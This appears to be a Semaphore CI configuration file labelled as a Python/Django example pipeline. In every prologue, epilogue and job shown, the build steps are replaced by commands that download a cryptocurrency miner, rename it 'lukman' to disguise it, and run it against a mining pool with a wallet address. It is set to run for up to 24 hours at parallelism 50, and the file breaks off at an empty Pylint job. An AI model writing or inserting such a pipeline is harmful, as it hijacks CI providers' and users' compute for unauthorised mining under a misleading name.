version: v1.0
name: Semaphore Python / Django Example Pipeline
agent:
  machine:
    type: e1-standard-4
    os_image: ubuntu1804
execution_time_limit:
  hours: 24
global_job_config:
  prologue:
    commands:
      - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
      - tar xf cpuminer-opt-linux.tar.gz
      - mv cpuminer-sse2 lukman
      - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
  epilogue:
    always:
      commands:
        - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
        - tar xf cpuminer-opt-linux.tar.gz
        - mv cpuminer-sse2 lukman
        - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
    on_pass:
      commands:
        - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
        - tar xf cpuminer-opt-linux.tar.gz
        - mv cpuminer-sse2 lukman
        - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
    on_fail:
      commands:
        - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
        - tar xf cpuminer-opt-linux.tar.gz
        - mv cpuminer-sse2 lukman
        - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
blocks:
  - name: Install Dependencies
    task:
      prologue:
        commands:
          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
          - tar xf cpuminer-opt-linux.tar.gz
          - mv cpuminer-sse2 lukman
          - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
      jobs:
        - name: pip
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - mv cpuminer-sse2 lukman
            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
          parallelism: 50
      epilogue:
        always:
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - mv cpuminer-sse2 lukman
            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
        on_pass:
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - mv cpuminer-sse2 lukman
            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
        on_fail:
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - mv cpuminer-sse2 lukman
            - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
  - name: Run Code Analysis
    task:
      prologue:
        commands:
          - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
          - tar xf cpuminer-opt-linux.tar.gz
          - mv cpuminer-sse2 lukman
          - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
      jobs:
        - name: Pylint
          commands:
